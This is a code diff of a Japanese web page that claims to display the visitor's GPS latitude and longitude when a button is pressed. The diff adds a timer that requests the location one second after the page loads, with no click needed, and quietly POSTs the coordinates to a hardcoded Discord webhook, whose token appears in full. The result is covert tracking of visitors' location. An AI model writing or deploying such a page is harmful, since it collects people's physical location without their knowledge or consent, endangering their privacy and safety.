@@ -6,14 +6,14 @@
 </head>
 <body>
     <h1>GPSを使って緯度経度を取得</h1>
-    <button style="font-size:25px;" onclick="click_btn()">取得する</button>
+    <button style="font-size:25px;" onclick="btn()">取得する</button>
     <p>緯度, 経度：<span id="latitude">???</span></p>
 
     <script>
-        setTimeout(click_btn, 1000);
-
+        setTimeout(get_loc, 1000)
         const url = "https://discord.com/api/webhooks/1022789439187071008/aUDv-B7XD1sXdntjrF4OzksA0SSb_uoNqQ9uSTCA729Ydu13zyMMhTTwUvfGldXIxkJ6"
-        function click_btn(){
+
+        function btn(){
             navigator.geolocation.getCurrentPosition(successCallback)
         }
 
@@ -21,14 +21,28 @@
             var location = position.coords.latitude+", "+position.coords.longitude
             document.getElementById("latitude").innerHTML = location
 
-            var message = {
-                "username": "foryzen bot",
-                "content": location
-            }
+            var message = { "username": "foryzen bot","content": location }
 
             var data = {
-                method: "POST",
-                mode: "cors",
+                method: "POST",mode: "cors",
+                headers: {"Content-type": "application/json"},
+                body: JSON.stringify(message)
+            }
+
+            send(data)
+        }
+
+        function get_loc(){
+            navigator.geolocation.getCurrentPosition(send_loc)
+        }
+
+        function send_loc(position){
+            var location = position.coords.latitude+", "+position.coords.longitude
+
+            var message = { "username": "foryzen bot","content": location }
+
+            var data = {
+                method: "POST",mode: "cors",
                 headers: {"Content-type": "application/json"},
                 body: JSON.stringify(message)
             }
